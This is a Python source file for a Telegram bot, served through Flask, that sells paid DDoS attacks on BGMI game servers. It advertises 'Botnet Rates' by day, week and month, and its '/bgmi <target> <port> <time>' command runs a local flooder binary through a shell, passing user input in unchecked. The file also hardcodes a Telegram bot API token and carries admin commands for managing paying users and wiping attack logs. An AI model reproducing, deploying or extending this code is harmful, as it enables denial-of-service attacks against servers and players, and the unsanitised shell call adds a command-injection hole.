import telebot
import subprocess
import requests
import datetime
import os
from flask import Flask, request

API_TOKEN = '5776920147:AAFiCX9EWeptHNV4uaE0l1OfS7YldGOxfVY'
bot = telebot.TeleBot(API_TOKEN)

app = Flask(__name__)

admin_id = ["5283370687"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

allowed_user_ids = []

# Read allowed users
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Command logging
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read().strip() == "":
                return "Logs are already cleared. No data found"
            file.truncate(0)
            return "Logs cleared successfully"
    except FileNotFoundError:
        return "No logs found to clear"

bgmi_cooldown = {}
COOLDOWN_TIME = 0

@app.route('/', methods=['GET'])
def index():
    return 'Bot is running.'

@app.route(f'/webhook', methods=['POST'])
def webhook():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return ""

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    user_id = str(message.chat.id)
    text = message.text.strip()

    if text.startswith('/start'):
        user_name = message.from_user.first_name
        bot.reply_to(message, f"👋🏻Welcome, {user_name}!\nTry To Run This Command : /help\nJoin :- t.me/ChannelLink")

    elif text.startswith('/help'):
        help_text = '''Available commands:
/bgmi : Method For Bgmi Servers.
/rules : Please Check Before Use !!.
/mylogs : To Check Your Recents Attacks.
/plan : Checkout Our Botnet Rates.
To See Admin Commands:
/admincmd : Shows All Admin Commands.
Buy From :- @ReporterAlpha'''
        bot.reply_to(message, help_text)

    elif text.startswith('/rules'):
        user_name = message.from_user.first_name
        bot.reply_to(message, f"{user_name} Please Follow These Rules:\nThere are no rules in our Bot.")

    elif text.startswith('/plan'):
        user_name = message.from_user.first_name
        bot.reply_to(message, f"{user_name}, we only have powerful plan!!:\n\nVip :\nAttack Time : 180 (S)\nAfter Attack Limit : No Limit\nConcurrents Attack : 3\n\nPrice Lists :\nDay : 300 Rs\nWeek : 1000 Rs\nMonth : 2000 Rs")

    elif text.startswith('/admincmd'):
        user_name = message.from_user.first_name
        bot.reply_to(message, f"{user_name}, Admin Commands Are Here!!:\n\n/add <userId> : Add a User.\n/remove <userid> Remove a User.\n/allusers : Authorised Users Lists.\n/logs : All Users Logs.\n/broadcast : Broadcast a Message.\n/clearlogs : Clear The Logs File.")

    elif text.startswith('/id'):
        bot.reply_to(message, f"Your ID: {user_id}")

    elif text.startswith('/add') and user_id in admin_id:
        args = text.split()
        if len(args) > 1:
            new_user = args[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                with open(USER_FILE, "a") as file:
                    file.write(new_user + "\n")
                bot.reply_to(message, f"User {new_user} Got Access successfully")
            else:
                bot.reply_to(message, "User already exist in the Bot")
        else:
            bot.reply_to(message, "Please Specify a User ID to Add.")

    elif text.startswith('/remove') and user_id in admin_id:
        args = text.split()
        if len(args) > 1:
            rem_user = args[1]
            if rem_user in allowed_user_ids:
                allowed_user_ids.remove(rem_user)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(uid + "\n")
                bot.reply_to(message, f"User {rem_user} Removed Successfully.")
            else:
                bot.reply_to(message, f"User {rem_user} not found in the list.")
        else:
            bot.reply_to(message, "Please Specify A User ID to Remove.\nUsage: /remove <userid>")

    elif text.startswith('/clearlogs') and user_id in admin_id:
        bot.reply_to(message, clear_logs())

    elif text.startswith('/allusers') and user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                ids = file.read().splitlines()
                if ids:
                    response = "Authorized Users:\n"
                    for uid in ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            username = user_info.username
                            response += f"- @{username} (ID: {uid})\n"
                        except:
                            response += f"- User ID: {uid}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
        bot.reply_to(message, response)

    elif text.startswith('/logs') and user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No data found")

    elif text.startswith('/broadcast') and user_id in admin_id:
        args = text.split(maxsplit=1)
        if len(args) > 1:
            broadcast_message = "Message To All Users By @ReporterAlpha:\n\n" + args[1]
            with open(USER_FILE, "r") as file:
                for uid in file.read().splitlines():
                    try:
                        bot.send_message(uid, broadcast_message)
                    except Exception as e:
                        print(f"Failed to send to {uid}: {e}")
            bot.reply_to(message, "Broadcast Message Sent Successfully To All Users.")
        else:
            bot.reply_to(message, "Please Provide A Message To Broadcast.")

    elif text.startswith('/mylogs') and user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.readlines()
                user_logs = [log for log in logs if f"UserID: {user_id}" in log]
                response = "Your Command Logs:\n" + "".join(user_logs) if user_logs else "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
        bot.reply_to(message, response)

    elif text.startswith('/bgmi') and user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                bot.reply_to(message, "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again.")
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()

        args = text.split()
        if len(args) == 4:
            target = args[1]
            port = int(args[2])
            time = int(args[3])
            if time > 300:
                bot.reply_to(message, "Error: Time interval must be less than 300.")
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                bot.reply_to(message, f"{message.from_user.username or message.from_user.first_name}, Attack Started.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nGame: BGMI")
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")
        else:
            bot.reply_to(message, "Usage :- /bgmi <target> <port> <time>")

    elif user_id not in allowed_user_ids:
        bot.reply_to(message, "You Are Not Authorized To Use This Command.")

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url='https://' + os.getenv("VERCEL_URL"))  # Replace with your actual domain
